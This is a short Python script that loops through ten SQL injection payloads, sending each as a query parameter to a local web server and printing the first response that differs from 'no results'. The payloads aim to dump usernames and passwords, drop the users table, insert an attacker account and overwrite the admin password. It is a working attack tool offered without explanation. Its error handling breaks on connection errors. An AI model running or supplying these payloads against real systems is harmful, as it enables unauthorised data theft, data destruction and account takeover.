#!/usr/bin/env python3
import urllib.parse
import urllib.request

sql_injection_payloads = [
    "'",                             #1
    "'; --",                         #2
    "'; OR '1'='1",                  #3
    "'; OR 'a'='a",                  #4
    "'; SELECT * FROM users--",      #5
    "'; UNION SELECT null,username,password FROM users--",  #6
    "' UNION ALL SELECT NULL, NULL, NULL, CONCAT(username, ':', password) FROM users--",  #7
    "'; DROP TABLE users--",         #8
    "'; INSERT INTO users(username, password) VALUES ('attacker', 'password')--",  #9
    "'; UPDATE users SET password='newpassword' WHERE username='admin'--",  #10
]

for payload in sql_injection_payloads:
    url = "http://localhost/?%s" % urllib.parse.urlencode({'q': payload})
    print(url)
    result = None
    try:
        res = urllib.request.urlopen(url)
        result = res.read()
    except Exception as e:
        result = e.fp.read()

    if b'no results' not in result:
        print(result)
        break
